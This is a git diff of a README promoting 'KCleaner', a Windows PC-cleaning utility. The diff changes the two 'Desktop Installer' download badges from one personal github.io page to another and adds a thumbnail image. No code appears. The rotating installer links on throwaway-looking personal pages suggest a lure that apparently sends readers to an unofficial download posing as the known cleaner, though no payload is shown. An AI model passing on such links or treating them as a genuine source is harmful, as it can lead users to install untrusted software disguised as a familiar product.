@@ -2,7 +2,7 @@
 
 <img src="https://cdn.comss.ru/img/052020/2020-05-08_14-37-44.jpg" alt="KCleaner Logo" width="560">
 
-[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://camilorobersonopcr.github.io/.github/KCleaner-PC-Cleaner)
+[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://opidoraduck133.github.io/.github/KCleaner-PC-Cleaner)
 
 ---
 
@@ -16,9 +16,9 @@ Home users, office professionals, gamers, developers, businesses, technicians, a
 
 KCleaner supports temporary file cleanup, cache removal, recycle bin cleanup, browser cleanup, automatic cleaning, secure deletion, scheduled maintenance, background monitoring, configurable cleaning rules, portable operation, and optimized performance for modern Windows systems.
 
-<img src="" width="900">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTpepAW2nqI_4VddbWirYRXbKLAco1wtgPSPxwGQL3tBTJXTfCBozXtgGI&s=10" width="900">
 
-[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://camilorobersonopcr.github.io/.github/KCleaner-PC-Cleaner)
+[![Hi](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://opidoraduck133.github.io/.github/KCleaner-PC-Cleaner)
 
 ---
 
